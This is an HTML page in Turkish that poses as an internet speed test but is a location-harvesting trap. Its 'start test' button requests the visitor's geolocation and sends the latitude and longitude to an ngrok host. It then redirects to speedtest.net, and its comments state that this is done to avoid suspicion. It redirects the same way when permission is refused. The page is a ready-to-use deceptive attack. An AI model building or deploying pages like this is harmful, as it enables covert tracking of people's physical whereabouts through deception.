<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>İnternet Hız Testi</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
        .container { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        button { background-color: #007bff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>

<div class="container">
    <h1>Hız Testini Başlat</h1>
    <p>Bağlantı kalitenizi ölçmek için aşağıdaki butona tıklayın.</p>
    <button onclick="getLocation()">TESTİ BAŞLAT</button>
</div>

<script>
    function getLocation() {
        if (navigator.geolocation) {
            // Konum izni ister ve başarılıysa sendToServer fonksiyonuna gider
            navigator.geolocation.getCurrentPosition(sendToServer, handleError);
        } else {
            alert("Tarayıcınız bu özelliği desteklemiyor.");
        }
    }

    function sendToServer(position) {
        const data = {
            lat: position.coords.latitude,
            lon: position.coords.longitude
        };

        // Senin Ngrok linkin
        fetch('https://cozy-prefix-slashing.ngrok-free.dev/konum-kaydet', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(() => {
            // Veri gönderilince şüphe çekmemek için Speedtest'e yönlendirir
            window.location.href = "https://www.speedtest.net";
        })
        .catch(err => console.error("Hata oluştu:", err));
    }

    function handleError(error) {
        console.log("Konum izni reddedildi veya hata oluştu.");
        // İzin reddedilse bile kullanıcıyı yönlendir ki anlamasın
        window.location.href = "https://www.speedtest.net";
    }
</script>

</body>
</html>
